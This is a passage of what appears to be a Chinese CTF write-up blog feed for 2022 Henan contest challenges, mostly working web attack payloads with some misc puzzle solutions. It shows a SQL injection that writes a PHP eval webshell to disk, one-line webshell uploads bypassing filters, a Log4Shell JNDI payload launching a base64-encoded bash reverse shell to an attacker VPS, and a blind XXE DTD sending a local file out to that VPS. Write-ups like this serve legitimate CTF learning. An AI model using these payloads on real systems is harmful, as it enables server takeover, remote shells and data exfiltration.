class="hljs-string">&#x27;get&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$info</span>))&#123;<br>    <span class="hljs-title function_ invoke__">is_numeric</span>(@<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;year&quot;</span>])?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Sorry~&quot;</span>):<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span>(@<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;year&quot;</span>])&#123;<br>        (<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;year&quot;</span>]=<span class="hljs-number">2022</span>)?<span class="hljs-variable">$Step1</span>=True:<span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(@<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;items&quot;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;items&quot;</span>][<span class="hljs-number">1</span>])OR <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;items&quot;</span>])!==<span class="hljs-number">3</span> ) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Sorry~&quot;</span>);<br>        <span class="hljs-variable">$status</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;game&quot;</span>, <span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;items&quot;</span>]);<br>        <span class="hljs-variable">$status</span>===<span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Sorry~&quot;</span>):<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;items&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)&#123;<br>            <span class="hljs-variable">$val</span>===<span class="hljs-string">&quot;game&quot;</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Sorry~&quot;</span>):<span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <span class="hljs-variable">$Step2</span>=True;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$Step1</span> &amp;&amp; <span class="hljs-variable">$Step2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;FLAG&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">?<span class="hljs-keyword">get</span>=&#123;<span class="hljs-string">&quot;year&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>,<span class="hljs-string">&quot;items&quot;</span>:[<span class="hljs-literal">true</span>,[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>],<span class="hljs-string">&quot;skiing2&quot;</span>]&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102001226.png" alt="image-20221029204002629"></p><h2 id="HNGK-out"><a href="#HNGK-out" class="headerlink" title="HNGK-out"></a>HNGK-out</h2><p>sql注入（联合查询）</p><p>描述：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">一个简单的<span class="hljs-keyword">sql</span>注入<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102001227.png" alt="image-20221029204232797"></p><p>发现过滤了</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">select</span> <span class="hljs-keyword">or</span> 空格<br></code></pre></td></tr></table></figure><p>payload示例：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">?id=<span class="hljs-string">0&#x27;u</span>nion<span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(passwoorrd)<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>users ;<span class="hljs-comment">%00</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102001228.png" alt="image-20221029204317989"></p><p>双写绕过关键字，空格也可以双写绕过。</p><p>搜寻了一番，发现数据库没有flag，上马</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-string">0&#x27;u</span>nion<span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x3c3f3d6576616c28245f504f53545b315d293b3f3e</span><span class="hljs-comment">/**/</span>into<span class="hljs-comment">/**/</span>outfile<span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;/var/www/html/1.php&#x27;</span>;<span class="hljs-comment">%00</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102001229.png" alt="image-20221029204452558"></p><p>虽然报错，但是小马已经写入了。</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102001230.png" alt="image-20221029204537963"></p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102001231.png" alt="image-20221029204600709"></p>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>2022</tag>
      
      <tag>河南</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022_河南省金盾信安杯</title>
    <link href="/2023/01/10/2022-%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF/"/>
    <url>/2023/01/10/2022-%E6%B2%B3%E5%8D%97%E7%9C%81%E9%87%91%E7%9B%BE%E4%BF%A1%E5%AE%89%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="盗梦空间"><a href="#盗梦空间" class="headerlink" title="盗梦空间"></a>盗梦空间</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009324.png" alt="image-20221218211914987"></p><p>密钥：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">PB<span class="hljs-number">5</span>CMZCPGU<span class="hljs-number">7</span>GSJK<span class="hljs-symbol">NJRDUQYJFMZJE24</span>BSIR<span class="hljs-number">3</span>TGI<span class="hljs-number">3</span>TJ<span class="hljs-number">55</span>FGQ<span class="hljs-number">2</span>GERJGIWDAJBHTK<span class="hljs-number">2</span>BVIFIDK<span class="hljs-symbol">NZ2</span>LJKFK<span class="hljs-symbol">ND2</span>L<span class="hljs-number">5</span>QX<span class="hljs-number">42</span>B<span class="hljs-number">6</span>HJJFA<span class="hljs-number">7</span>LLLBHUE<span class="hljs-number">4</span>S<span class="hljs-number">5</span>MZTDYTRTLFAHUVBMF<span class="hljs-symbol">N5</span>SWQLLLZRWQ<span class="hljs-number">6</span>SH<span class="hljs-meta">O5</span>CTMXRYKV<span class="hljs-number">5</span>FMLSCLEUWSWBQJI<span class="hljs-number">2</span>VGOR<span class="hljs-number">4</span>JE<span class="hljs-number">5</span>UYUKQPRXTWJLUJB<span class="hljs-number">3</span>TWVKZF<span class="hljs-name">M3</span>F<span class="hljs-number">6</span>WTRJYRFC<span class="hljs-number">432</span>KVEC<span class="hljs-number">4</span>ILYKRTTCQTFKBWTAYS<span class="hljs-symbol">NN5</span>XTE<span class="hljs-number">2</span>TKMBSHW<span class="hljs-symbol">NSFNQQVURCZO55</span><span class="hljs-name">G6</span>OZUF<span class="hljs-symbol">NKSIOJRGA2</span>EYYKOMJMXK<span class="hljs-number">3</span>TYIB<span class="hljs-number">4</span>UWZLRJ<span class="hljs-number">54</span>GUTLWFJWEWTLKMR<span class="hljs-number">6</span>TKJSHOUYWMKS<span class="hljs-number">7</span>IUUWMMDXL<span class="hljs-number">5</span>QUC<span class="hljs-number">2</span>KJEQWE<span class="hljs-number">4</span>R<span class="hljs-number">2</span>VFJCQ====<br></code></pre></td></tr></table></figure><p>这种适合用ciphey直接解</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009326.png" alt="image-20221218183341822"></p><h2 id="Megumi"><a href="#Megumi" class="headerlink" title="Megumi"></a>Megumi</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009327.png" alt="image-20221218223335354"></p><p>一波检测操作下来无任何发现。通过题目描述，搜一下图</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009328.png" alt="image-20221218223657591"></p><p>搜索：不起眼女主角培育法 同人游戏社团</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009329.png" alt="image-20221218223808155"></p><p>得到社团Blessing Software。到这一步卡死。</p><p>后面给出了提示</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">Misc-Megumi<br><br>guess一下是什么隐写<br></code></pre></td></tr></table></figure><p>那必然outguess试一下</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009330.png" alt="image-20221218225038634"></p><p>试了几次，key是全小写的社团名。</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;Megumi-Kato&#125;</span><br></code></pre></td></tr></table></figure><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezphp1"><a href="#ezphp1" class="headerlink" title="ezphp1"></a>ezphp1</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009331.png" alt="image-20221218211601609"></p><p>扫描目录得到index.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span> xml:lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br><br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>&gt;<br>&lt;style&gt;<br>body &#123; <br>background: pink <span class="hljs-title function_ invoke__">url</span>(<span class="hljs-string">&#x27;bg.png&#x27;</span>) no-repeat;<br>background-size: cover; <br>&#125;<br>&lt;/style&gt;<br>&lt;/head&gt;<br><br>&lt;body &gt;<br>&lt;h1&gt;我想有人一下子就猜出题是谁出的了。&lt;/h1&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$query</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;QUERY_STRING&quot;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== False)<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f_name&#x27;</span>]))&#123;<br><span class="hljs-variable">$path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f_name&#x27;</span>];<br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f_content&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(eval)|(assert)|(system)|(exec)|(shell_exec)|(popen)|(passthru)|(pcntl_exec)|(preg_replace)|(create_function)|(array_map)|(call_user_func)|(call_user_func_array)|(array_filter)|(uasort)/i&#x27;</span>, <span class="hljs-variable">$content</span>) !== <span class="hljs-number">0</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono!&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt; <span class="hljs-number">22</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;why are you so LONG?&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$path</span>, <span class="hljs-variable">$content</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ok&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>$_SERVER[“QUERY_STRING”]的绕过</p><p>参考<a href="http://t.zoukankan.com/tlbjiayou-p-12564440.html">http://t.zoukankan.com/tlbjiayou-p-12564440.html</a></p><p>_使用.或者+都可以绕过</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GET：?f.<span class="hljs-attribute">name</span>=shell.php<br>POST：<span class="hljs-attribute">f_content</span>=&lt;?=$_GET[1](<span class="hljs-variable">$_GET</span>[2]);<br></code></pre></td></tr></table></figure><p>先在&#x2F;tmp发现flag.sh</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">/shell.php?<span class="hljs-number">1</span>=<span class="hljs-keyword">assert</span>&amp;<span class="hljs-number">2</span>=print<span class="hljs-constructor">_r(<span class="hljs-params">scandir</span>(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">tmp</span>&#x27;)</span>);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009332.png" alt="image-20221218130522016"></p><p>接着show_source读取得到flag位置&#x2F;usr&#x2F;f1ag_here</p><p>最后读取flag即可</p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GET：?f.<span class="hljs-attribute">name</span>=shell.php<br>POST：<span class="hljs-attribute">f_content</span>=&lt;?=$_GET[1](<span class="hljs-variable">$_GET</span>[2]);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009333.png" alt="image-20221218130432260"></p><h2 id="ezphp2"><a href="#ezphp2" class="headerlink" title="ezphp2"></a>ezphp2</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009334.png" alt="image-20221218211616693"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>] == <span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-variable">$query </span>= <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;QUERY_STRING&quot;</span>]);<br><br><span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== False)<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br><br><span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name_nnnn&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$name </span>= <span class="hljs-string">&quot;Upld0d/&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name_nnnn&#x27;</span>];<br>  <span class="hljs-variable">$text </span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file_c&#x27;</span>];<br><br>  <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$text</span>) &gt; <span class="hljs-number">18</span>)<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>  <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?ph.|flag/i&#x27;</span>, <span class="hljs-variable">$text</span>) !== <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>  <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$text</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ok&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GET：/index.php?name.<span class="hljs-attribute">nnnn</span>=shell.php<br>POST：<span class="hljs-attribute">file_c</span>=&lt;?=eval($_GET[0]);<br></code></pre></td></tr></table></figure><p>&#x2F;Upld0d&#x2F;shell.php</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/shell.php?<span class="hljs-attribute">0</span>=phpinfo();<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009335.png" alt="image-20221218115938274"></p><p><a href="http://59.110.213.14:51154/Upld0d/shell.php?0=show_source(&#39;/tmp/flag.sh&#39;)">http://59.110.213.14:51154/Upld0d/shell.php?0=show_source(&#39;/tmp/flag.sh&#39;)</a>;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>sed -i <span class="hljs-string">&quot;s/flag_here/<span class="hljs-variable">$1</span>/&quot;</span> /flaaaaaag<br></code></pre></td></tr></table></figure><p>得到flag位置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/Upld0d/</span>shell.php?<span class="hljs-number">0</span>=show_source(<span class="hljs-string">&#x27;/flaaaaaag&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009336.png" alt="image-20221218130348473"></p><h2 id="图书馆"><a href="#图书馆" class="headerlink" title="图书馆"></a>图书馆</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009337.png" alt="image-20221218211637237"></p><p>CVE-2021-44228</p><p>先使用DNSLOG测一下<a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST <span class="hljs-regexp">/api/</span>loginCheck<br>id=<span class="hljs-number">999</span>&amp;passwd=<span class="hljs-variable">$&#123;jndi:ldap://67xhrk.dnslog.cn&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009338.png" alt="image-20221218192630590"></p><p>存在漏洞</p><p>在VPS上搭建一个ldap服务</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar JNDI-Injection-Exploit-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar -C <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9WUFMvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|bash&quot;</span> -A <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009339.png" alt="image-20221218193053982"></p><p>再起一个终端监听</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009340.png" alt="image-20221218193329426"></p><p>cat flag</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009341.png" alt="image-20221218193405130"></p><h2 id="有来无回"><a href="#有来无回" class="headerlink" title="有来无回"></a>有来无回</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009342.png" alt="image-20221218211649437"></p><p>题目描述给了xxe.php</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Can you use Blind XXE <span class="hljs-built_in">to</span> build <span class="hljs-keyword">a</span> OOB <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> /tmp/flag.txt ?<br></code></pre></td></tr></table></figure><p>提示需要OOB，外带数据，我习惯用VPS。</p><p>VPS本地文件evil.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % all<br>&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://VPS/evil.php?xe=%file;&#x27;&quot;<br>&gt;<br>%all;<br></code></pre></td></tr></table></figure><p>VPS文件evil.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xe&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$content</span>))&#123;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-string">&#x27;更新时间:&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d H:i:s&quot;</span>).<span class="hljs-string">&quot;\n&quot;</span>.<span class="hljs-variable">$content</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no data input&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE ANY[<br>&lt;!ENTITY % file SYSTEM &quot;file:///tmp/flag.txt&quot;&gt;<br>&lt;!ENTITY % remote SYSTEM &quot;http://VPS/evil.dtd&quot;&gt;<br>%remote;<br>%send;<br>]&gt;<br></code></pre></td></tr></table></figure><p>其实并没有外带成功，触发evil.php将flag读出，但是这里触发了evil.dtd，并且语句报错爆出了flag。</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009343.png" alt="image-20221218194358705"></p><h2 id="反败为胜"><a href="#反败为胜" class="headerlink" title="反败为胜"></a>反败为胜</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009344.png" alt="image-20221218211704271"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml">U2FsdGVkX19jYOTTVyrJhkVnOy4DucIvfuvRB3i8cJkHc0h3f1Hg5Dqsd+KeRgj6<br>BhlZeiD4FvK3YXfLuK0aKvseB8C7vKbuCrY9+AVyE736cnMNTRv93/9uxy7UEcwW<br>ywp1WaOGNcgygqvCOFOwLna0sWzo7QIAM9sm00gEKfYfC6M2H9HFGpJ0OPA/a9au<br>xjN5ICGqTWKVyc8BEM68MhEQlskEEnYu5H46009okCYfP4tZmbRtxIXid9VjCK0w<br>F8so7K25CoXG6Lbn7YbdqehYquo9ZHyuBLU8eItPQx99WvPb5FIMroAzMiqmCBzU<br>BbPuGOb0pAHZFE/zPh2gBJxV5JST/3qDCPFm++/LAZzjkuVd+z/oVP37oC1vn2x6<br>oYer8UZxhl1P2b/bDbpi51zuPYs3EsbDlCLLf5DMbjWH+d8lWUNicjYb4Rjqx6w8<br>s/8IDzFlu46cTawqu5iGHxDWRsWLxxucUCT0jxmEQmd8/AFPwGggk/dldoXSLCXG<br>gpRAYJITVJar1A3l4b54ZDjjB/mbh1OrqalKWeISNQEE<br><br><br><span class="hljs-comment">&lt;!--RC40626--&gt;</span><br></code></pre></td></tr></table></figure><p>RC4解密得到</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102009345.png" alt="image-20221218123445091"></p><p><a href="http://www.jsons.cn/rc4encrypt/">http://www.jsons.cn/rc4encrypt/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;ser.php: You find me!&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ouo</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$ser_code</span> = <span class="hljs-string">&quot;ser&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;ser_code)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;ser_code == <span class="hljs-string">&quot;FLAG&quot;</span>)<br>                <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;&#123;flag&#125;&quot;</span>);<br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try Again!&#x27;</span>);<br>        &#125;&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span 